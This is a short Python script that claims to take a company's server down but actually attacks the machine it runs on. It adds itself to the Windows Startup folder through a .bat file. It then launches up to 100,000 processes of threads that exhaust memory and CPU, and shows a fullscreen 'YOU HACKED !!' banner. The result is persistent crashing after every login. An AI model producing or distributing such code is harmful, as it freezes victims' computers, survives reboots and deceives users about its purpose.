import os, sys, time, multiprocessing, threading
from tkinter import *

a= input("Enter the name of company you want to make their server down");

def add_to_startup(script_path):
    startup_dir = os.getenv('APPDATA') + r"\Microsoft\Windows\Start Menu\Programs\Startup"
    bat_path = os.path.join(startup_dir, "ultrastress.bat")
    with open(bat_path, 'w') as f:
        f.write(f'start "" python "{script_path}"')

def stress_ram_forever():
    x = []
    while True:
        x.append('A' * 10**6) 

def stress_thread_bundle():
    for _ in range(300):  
        t = threading.Thread(target=stress_ram_forever)
        t.daemon = True
        t.start()
    while True:
        pass  

def start_max_stress():
    for _ in range(100000):  
        multiprocessing.Process(target=stress_thread_bundle).start()

def hacked_gui():
    root = Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    Label(root, text=" YOU HACKED !! ", fg='red', bg='black',
          font=('Courier', 55, 'bold')).pack(expand=True)
    root.mainloop()

if __name__ == "__main__":
    path = os.path.abspath(sys.argv[0])
    add_to_startup(path)
    time.sleep(2)
    threading.Thread(target=start_max_stress, daemon=True).start()
    hacked_gui()
